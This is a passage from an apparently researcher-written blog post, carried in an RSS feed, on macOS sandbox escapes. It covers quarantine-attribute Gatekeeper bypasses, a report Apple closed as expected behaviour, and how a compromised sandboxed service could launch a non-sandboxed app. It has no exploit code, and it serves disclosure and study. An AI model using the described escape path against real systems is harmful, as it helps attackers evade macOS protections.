      <li>File quarantine attribute lost during decompression == <strong>Gatekeeper Bypass</strong> == <strong>Sandbox Escape</strong>. E.g., <a href="https://breakpoint.sh/posts/bypassing-the-macos-gatekeeper">CVE-2021-30990</a></li>
    </ul>
  </li>
  <li>
    <p>A few sandbox escape vulnerabilities and the exploits</p>
  </li>
  <li>
    <ul>
      <li>
        <p>And more?</p>
      </li>
      <li>
        <ul>
          <li>There are 5 reports still in the patching queue</li>
          <li>Find your own sandbox escape vulnerabilities :P</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h3 id="one-more-thing">One More Thing</h3>

<p>I submitted this report to Apple:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020164839630.png" alt="image-20241020164839630"></p>

<p>Apple deemed it an expected behavior and closed the report:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020164854324.png" alt="image-20241020164854324"></p>

<p>I can understand why Apple thinks this is an expected behavior. Because the newly launched application is not in the context of the current process and it cannot share entitlements or privileges that the current process may have.</p>

<h3 id="my-thoughts">My thoughts</h3>

<ul>
  <li>The <strong>App Sandbox</strong>: dropped files are quarantined <strong>by default</strong>.</li>
  <li>The <strong>Service Sandbox</strong>: dropped files are <strong>not quarantined by default.</strong></li>
  <li>
    <ul>
      <li>
        <ul>
          <li>Not a flaw: The newly launched process is <strong>not in the current service execution context</strong>, and thus canâ€™t share the entitlements/privileges of the current service.</li>
          <li>Itâ€™s a flaw: Once an attacker get the remote code execution (RCE) in a sandbox-restricted service context (e.g., <strong>IMTranscoderAgent, 0-click exploited by NSO Group</strong>), he can drop and launch a new non-sandboxed application to get rid of the sandbox restriction of the target service (<strong>IMTranscoderAgent</strong>).</li>
          <li>e.g., â€œ<code>com.apple.WebDriver.HTTPService.xpc</code>â€ calls the API â€œ<strong>WBSEnableSandboxStyleFileQuarantine</strong>â€ manually.</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Escape from the <strong>App Sandbox</strong> to the <strong>Service Sandbox</strong> == <strong>Non Sandbox</strong> (<strong>macOS Only</strong>)</li>
</ul>

<h3 id="resources">Resources</h3>

<p>Here is a list of resources for reference:</p>

<ul>
  <li>https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html</li>
  <li>https://saelo.github.io/presentations/bits_of_launchd.pdf</li>
  <li>https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html</li>
  <li>https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/</li>
  <li>https://i.blackhat.com/EU-21/Wednesday/EU-21-Waisberg-Skeletons-In-The-App-Sandbox.pdf</li>
  <li>https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html</li>
  <li>https://breakpoint.sh/posts/bypassing-the-macos-gatekeeper</li>
  <li>https://jhftss.github.io/CVE-2022-26712-The-POC-For-SIP-Bypass-Is-Even-Tweetable/</li>
</ul>


  </div></div>]]></description>
        </item>
    </channel>
</rss>